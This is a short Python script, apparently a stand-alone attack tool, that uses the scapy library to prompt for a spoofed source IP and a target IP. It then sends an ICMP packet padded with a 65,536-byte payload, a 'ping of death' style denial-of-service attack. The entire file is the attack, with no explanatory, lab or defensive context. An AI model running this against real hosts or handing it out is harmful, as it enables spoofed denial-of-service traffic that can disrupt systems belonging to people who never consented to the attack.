from __future__ import print_function
from scapy.all import *

import sys

if sys.version_info < (3,0):
  input = raw_input

src = input('Enter A Spoofed IP:\t')
target = input('Enter Target IP:\t')


IP1 = IP(src=src, dst=target)
pkt = IP1 / ICMP() / ('m'*65536)
send(pkt)